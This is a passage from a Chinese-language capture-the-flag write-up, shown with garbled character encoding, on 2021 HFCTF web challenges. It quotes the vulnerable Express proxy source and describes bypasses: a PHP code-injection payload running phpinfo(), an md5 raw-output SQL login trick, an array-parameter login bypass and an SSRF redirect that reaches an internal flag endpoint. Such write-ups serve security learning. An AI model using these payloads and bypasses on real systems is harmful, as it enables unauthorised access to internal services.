srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403184354702"></p><p>å¯ä»¥çœ‹åˆ° <code>$pre</code> éƒ¨åˆ†å·²ç»æˆåŠŸè¢«é—­åˆäº†ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œ</p><p> <code>$pinjie</code> éƒ¨åˆ†æ‹¼æ¥ä¸æ­£å¸¸</p><p><code>unset($this-&gt;hive[&#39;s&#39;][&#39;&#39;]);</code> è¿™éƒ¨åˆ†æ­£å¸¸ï¼Œä½†å¤šäº† <code>);</code></p><div class="note quote"><p>è‡³äºä¸ºä»€ä¹ˆæˆ‘è¿™ä¹ˆç†Ÿç»ƒï¼Œç›´æ¥ç”¨æ•°ç»„ç»™é—­åˆäº†ï¼Œï¼Œå› ä¸ºä¸€å¼€å§‹ï¼Œï¼Œåœ¨åˆ†æ 3.7.1 æ—¶ï¼ŒæŠŠä»£ç æµï¼ŒåŒ…æ‹¬ <code>$this-&gt;compile</code> éƒ¨åˆ†ç»™æ•´æ˜ç™½äº†ï¼Œç„¶å 3.7.2 é‡æ„äº† <code>$this-&gt;compile</code> å¾ˆç±»ä¼¼ï¼Œæœ‰å…´è¶£å¯ä»¥å»çœ‹çœ‹ï¼Œå°±æ˜¯æ­£åˆ™æœ‰ç‚¹å¤šå’Œå¤æ‚ã€‚ã€‚ã€‚çœ‹çš„å¤´çš®å‘éº»</p></div><p>å°è¯•ä¼ å…¥ <code>a=s[]);phpinfo();//</code> è¿™æ ·ï¼Œåæ­£åé¢å¤šäº†çš„ <code>);</code> ä¼šè¢«æ³¨é‡Šæ‰ï¼ˆå¥½åƒå’Œæˆ‘æ–°å¹´å‡ºçš„ CTF æœ‰ç‚¹åƒï¼Œè¦é—­åˆåŠ æ³¨é‡Šï¼‰ï¼Œæ–­ç‚¹çœ‹çœ‹å‘—</p><p><img src="/img/2021hfctf/image-20210403185337497.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403185337497.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403185337497"></p><p><img src="/img/2021hfctf/image-20210403185407122.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403185407122.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403185407122"></p><p>ç„¶åçº¿ä¸Šç¯å¢ƒ cat ä¸€ä¸‹å°±å¥½äº†</p><p><img src="/img/2021hfctf/image-20210403185505318.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403185505318.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403185505318"></p><h2 id="â€œæ…¢æ…¢åšâ€-ç®¡ç†ç³»ç»Ÿ"><a href="#â€œæ…¢æ…¢åšâ€-ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="â€œæ…¢æ…¢åšâ€ ç®¡ç†ç³»ç»Ÿ"></a>â€œæ…¢æ…¢åšâ€ ç®¡ç†ç³»ç»Ÿ</h2><p>æ²¡åšå‡ºæ¥ï¼Œå†™æ€è·¯ï¼Œåç»­è¡¥ä¸Š</p><p>æç¤º</p><blockquote><p>ç¬¬ä¸€æ­¥ç™»å½•çš„sqlè¯­å¥æ˜¯â€SELECT * FROM users WHERE password = â€˜â€œ.md5($password,true).â€â€˜ limit 0,1â€;</p></blockquote><p>å…ƒè€çº§ <code>md5($password,true)</code> ç»•è¿‡ï¼Œä»¥å‰å®éªŒå§åˆ·è¿‡ï¼Œå¯ä»¥çœ‹ä»¥ä¸‹é“¾æ¥</p><p><a href="https://blog.csdn.net/March97/article/details/81222922">https://blog.csdn.net/March97/article/details/81222922</a></p><p>ä½†æ˜¯ã€‚ã€‚é»‘äººé—®å·.jpg </p><p><img src="/img/2021hfctf/image-20210403190124297.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403190124297.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403190124297"></p><p>å¥½ï¼Œä½ è¯´é¢˜ç›®æè¿°é‡è¦</p><blockquote><p><strong>è¿™ä¸ªsqlå§ï¼Œæœ‰ç‚¹ssrfçš„æ ·å­ï¼Œé¦–é¡µæ˜¯ä¸€ä¸ªå¾ˆæ™®é€šçš„sqlæ³¨å…¥ï¼Œæ²¡æœ‰ä»€ä¹ˆèŠ±æ ·ï¼Œä½†æ˜¯æˆ‘çš„admin.phpæ˜¯ä¸€ä¸ªå†…ç½‘çš„ç®¡ç†ç³»ç»Ÿï¼Œåªè¦ä½ ç”¨â€œçœŸ-adminâ€çš„å¯†ç ç™»å½•äº†ï¼Œå°±å¯ä»¥æ‹¿åˆ°flagï¼Œåæ­£æ…¢æ…¢åšå°±å¯¹äº†ï¼Œä¸è¦æ€¥èºï¼Œé™ä¸‹å¿ƒã€‚</strong></p></blockquote><p>å®Œå…¨ä¸çŸ¥é“ ssrf çš„ç‚¹åœ¨å“ªï¼Œä¸€å…±å°±å‘ç° index.php admin.php å’Œ flag.php ä¸‰ä¸ªæ–‡ä»¶ï¼Œå¥½äº†ï¼Œæ²¡æ€è·¯äº†ã€‚ï¼ˆè¿˜æ˜¯å¤ªèœäº†</p><p>emmï¼Œçœ‹æ¥åˆ«äººçš„wpï¼Œå‘ç°åŸæ¥ï¼Œï¼Œé™¤äº† ffifdyop è¿˜æœ‰å…¶ä»–çš„ï¼Œæ™•â€¦.</p><p>åç­‰ buu å‡ºå¤ç° ï¼ˆ</p><h2 id="internal-system"><a href="#internal-system" class="headerlink" title="internal_system"></a>internal_system</h2><p>æ²¡åšå‡ºæ¥ï¼Œä½†æ˜¯æ„Ÿè§‰æ¥è¿‘äº†</p><p>admin/admin ä¸€æŠŠæ¢­ï¼Œ</p><p><img src="/img/2021hfctf/image-20210403190428006.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403190428006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403190428006"></p><p>å¯†ç ç«Ÿç„¶æ˜¯é”™çš„ï¼Œä¸è¿‡æœ‰æç¤º</p><p>è®¿é—® <code>/source</code> è·å–æºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> router = express.Router()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isIp = <span class="built_in">require</span>(<span class="string">&#x27;is-ip&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> IP = <span class="built_in">require</span>(<span class="string">&#x27;ip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> UrlParse = <span class="built_in">require</span>(<span class="string">&#x27;url-parse&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;sha256, hint&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./utils&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> adminHash = sha256(sha256(salt + <span class="string">&#x27;admin&#x27;</span>) + sha256(salt + <span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = process.env.PORT || <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatResopnse</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(response) !== <span class="keyword">typeof</span>(<span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(response)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SSRF_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> host = <span class="keyword">new</span> UrlParse(url).hostname.replace(<span class="regexp">/\[|\]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> isIp(host) &amp;&amp; IP.isPublic(host)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FLAG_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> pathname = <span class="keyword">new</span> UrlParse(url).pathname</span><br><span class="line">    <span class="keyword">return</span> !pathname.startsWith(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OTHER_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] </span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.admin === <span class="literal">undefined</span> || req.session.admin === <span class="literal">null</span>) &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;username, password&#125; = req.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> hash = sha256(sha256(salt + username) + sha256(salt + password))</span><br><span class="line"></span><br><span class="line">        req.session.admin = hash === adminHash</span><br><span class="line"></span><br><span class="line">        res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/index&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.admin === <span class="literal">undefined</span> || req.session.admin === <span class="literal">null</span>) &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">admin</span>: req.session.admin&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.admin) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="built_in">decodeURI</span>(req.query.url);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> status = WAF_LISTS.map(<span class="function">(<span class="params">waf</span>)=&gt;</span>waf(url)).reduce(<span class="function">(<span class="params">a,b</span>)=&gt;</span>a&amp;&amp;b)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!status) &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;base&#x27;</span>, &#123;<span class="attr">title</span>: <span class="string">&#x27;WAF&#x27;</span>, <span class="attr">content</span>: <span class="string">&quot;Here is the waf...&quot;</span>&#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(<span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/search?url=<span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">            res.render(<span class="string">&#x27;base&#x27;</span>, response.data)</span><br><span class="line">        &#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;base&#x27;</span>, error.message)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">    </span><br><span class="line">router.post(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.admin) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// test url</span></span><br><span class="line">    <span class="comment">// not implemented here</span></span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">&quot;https://postman-echo.com/post&quot;</span></span><br><span class="line">    <span class="keyword">await</span> axios.post(<span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/search?url=<span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">    res.render(<span class="string">&#x27;base&#x27;</span>, <span class="string">&quot;Something needs to be implemented&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.all(<span class="string">&#x27;/search&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;You can only use proxy to aceess here!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> result = &#123;<span class="attr">title</span>: <span class="string">&#x27;Search Success&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> method = req.method.toLowerCase()</span><br><span class="line">    <span class="keyword">const</span> url = <span class="built_in">decodeURI</span>(req.query.url)</span><br><span class="line">    <span class="keyword">const</span> data = req.body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(method == <span class="string">&#x27;get&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(url)</span><br><span class="line">            result.content = formatResopnse(response.data)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(method == <span class="string">&#x27;post&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.post(url, data)</span><br><span class="line">            result.content = formatResopnse(response.data)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.title = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">            result.content = <span class="string">&#x27;Unsupported Method&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">        result.title = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">        result.content = error.message</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.json(result)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">    res.sendFile( __dirname + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;route.js&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;No Flag For You!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">hint</span>: hint&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ <code>login</code> æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å’Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req.session.admin = hash === adminHash</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æˆ‘ä»¬ä¼ å…¥çš„ä¸º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hash = sha256(sha256(salt + username) + sha256(salt + password))</span><br></pre></td></tr></table></figure><p>ç„¶åè§ä»£ç  13 å’Œ 15è¡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> adminHash = sha256(sha256(salt + <span class="string">&#x27;admin&#x27;</span>) + sha256(salt + <span class="string">&#x27;admin&#x27;</span>))</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½è¦æ˜¯ admin ä½†æ˜¯ï¼Œï¼Œä»–ä»¬é•¿åº¦å’Œå†…å®¹ä¸ä¸€æ ·  = =ï¼Œå¥½ï¼Œéå¸¸å¥½ï¼Œè¿˜å¥½ js æœ‰çš„ç‰¹æ€§å’Œ PHP æœ‰ç‚¹ç±»ä¼¼ï¼Œ<code>username</code> ç”¨æ•°ç»„å³å¯ç»•è¿‡</p><p><img src="/img/2021hfctf/image-20210403192049950.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403192049950.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403192049950"></p><p><img src="/img/2021hfctf/image-20210403192514722.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403192514722.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403192514722"></p><p>ç™»å½•æˆåŠŸåï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•è®¿é—® <code>/flag</code> æ¥å£ï¼Œä¸è¿‡å¿…é¡»ä¸ºå†…ç½‘ ip</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;No Flag For You!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">hint</span>: hint&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ä»£ç é‡Œæä¾› <code>/proxy</code> æ¥å£å¯ä»¥ä»£ç†è®¿é—®ï¼Œç„¶åè¿™ä¸ªæ¥å£æ˜¯æœ¬æœºè®¿é—®çš„ï¼Œæ‰€ä»¥å¯ä»¥è·³è¿‡è¿™ä¸ªé™åˆ¶</p><p>ç»•è¿‡ç‚¹1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SSRF_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> host = <span class="keyword">new</span> UrlParse(url).hostname.replace(<span class="regexp">/\[|\]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> isIp(host) &amp;&amp; IP.isPublic(host)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½ ä¼ å…¥çš„è¦æ˜¯ipï¼Œï¼Œä¸èƒ½æ˜¯åŸŸåï¼Œè€Œä¸”ï¼Œipå¿…é¡»æ˜¯å…¬ç½‘ipï¼Œå…¶å®è¿™ä¸ªå¥½åŠï¼Œæ•´ä¸ªå…¬ç½‘æœåŠ¡å™¨ï¼Œç„¶å</p><p>å†™å…¥ä»£ç é‡å®šå‘å³å¯</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617438507933-f4a12b2e-a3b0-4509-a7c9-d12d8bcd107d.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617438507933-f4a12b2e-a3b0-4509-a7c9-d12d8bcd107d.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>è‡³äºä¸ºå•¥åœ¨è¿™é‡Œå†™ <code>/flag</code> æ˜¯å› ä¸ºå†…éƒ¨ä»£ç†è¯·æ±‚ä¸ä¼šè§¦å‘è¿™ä¸ªwaf æœºåˆ¶</p><p>ç»•è¿‡ç‚¹2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FLAG_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> pathname = <span class="keyword">new</span> UrlParse(url).pathname</span><br><span class="line">    <span class="keyword">return</span> !pathname.startsWith(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ ä¸€ä¸‹</p><p><img 